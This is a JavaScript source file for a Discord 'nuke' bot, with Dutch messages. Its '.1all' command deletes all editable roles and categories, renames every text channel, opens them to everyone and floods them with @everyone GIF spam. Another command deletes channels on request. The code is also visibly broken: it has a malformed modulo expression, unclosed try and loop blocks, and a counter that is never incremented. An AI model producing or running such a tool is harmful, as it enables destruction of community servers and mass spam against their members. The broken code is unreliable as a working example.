import { Client, GatewayIntentBits, PermissionsBitField, ChannelType } from 'discord.js';
import http from 'http';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PREFIX = '.1';
const GIF_URL = "https://cdn.discordapp.com/attachments/1522698849276268634/1522701428466909326/togif.gif";

http.createServer((req, res) => res.end('Bot running!')).listen(3000);

client.once('ready', () => {
    console.log(`✅ Bot is online als ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift()?.toLowerCase();
    const spamAmount = parseInt(args[0]) || 5;

    if (command === 'all') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply("❌ Administrator rechten nodig!");
        }

        try {
            await message.author.send("⚠️ **FULL NUKE** ⚠️\nRollen + Categorieën verwijderen + Channels aanpassen.");
        } catch {}

        let cancelled = false;
        const collector = message.channel.createMessageCollector({
            filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
            time: 5000
        });
        collector.on('collect', () => cancelled = true);

        await new Promise(r => setTimeout(r, 5000));
        if (cancelled) return;

        // 1. Alle rollen verwijderen
        await message.reply("🗑️ Rollen verwijderen...");
        for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
            try { await role.delete(); await new Promise(r => setTimeout(r, 300)); } catch {}
        }

        // 2. Alle categorieën verwijderen
        await message.channel.send("🗑️ Categorieën verwijderen...");
        for (const category of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
            try { await category.delete(); await new Promise(r => setTimeout(r, 400)); } catch {}
        }

        // 3. Channels aanpassen
        await message.channel.send("🔄 Channels hernoemen + zichtbaar maken + spammen...");

        let processed = 0;
        for (const channel of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values()) {
            try {
                // Hernoemen
                await channel.setName("Finnson the goat");

                // Zorgen dat iedereen het kan zien
                await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                    ViewChannel: true,
                    SendMessages: true,
                    ReadMessageHistory: true
                });

                // Spam
                for (let i = 0; i < spamAmount; i++) {
                    await channel.send(`@everyone\n${GIF_URL}`);

                    if (i % == 0) {
                        await new Promise(r => setTimeout(r, 800));
                    } else {
                        await new Promise(r => setTimeout(r, 80));
                    }
                }

        await message.channel.send(`✅ Klaar! **${processed}** channels aangepast en gespamd.`);
        return;
    }

    // Normale delete
    let target = args.length > 0 ? message.mentions.channels.first() : message.channel;
    if (target) {
        try {
            await target.delete();
            message.reply(`🗑️ **${target.name}** verwijderd.`).catch(() => {});
        } catch {
            message.reply("❌ Kon niet verwijderen.").catch(() => {});
        }
    }
});

client.login(process.env.TOKEN);
